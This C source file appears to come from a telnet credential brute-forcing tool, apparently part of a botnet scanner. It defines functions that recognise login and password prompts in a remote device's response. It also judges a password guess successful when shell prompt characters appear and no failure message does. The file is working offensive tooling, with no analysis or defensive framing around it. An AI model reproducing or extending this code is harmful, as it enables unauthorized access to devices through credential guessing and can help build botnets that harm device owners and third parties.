#include <stdio.h>
#include <string.h>

#include "headers/main.h"
#include "headers/combos.h"

int check_login_resp(Brute *brute)
{
    if(strstr(brute->rdbuf, "sername") || strstr(brute->rdbuf, "ogin") || strstr(brute->rdbuf, "nter") || strstr(brute->rdbuf, "assword"))
        return 1;
    
    return 0;
}

int check_password_resp(Brute *brute)
{
    int len = strlen(brute->rdbuf);

    if(strstr(brute->rdbuf, "ncorrect") || strstr(brute->rdbuf, "ailed"))
        return 0;

    while(len--)
    {
        if(brute->rdbuf[len] == ':' || brute->rdbuf[len] == '>' || brute->rdbuf[len] == '$' || brute->rdbuf[len] == '#' || brute->rdbuf[len] == '%')
            return 1;
    }

    return 0;
}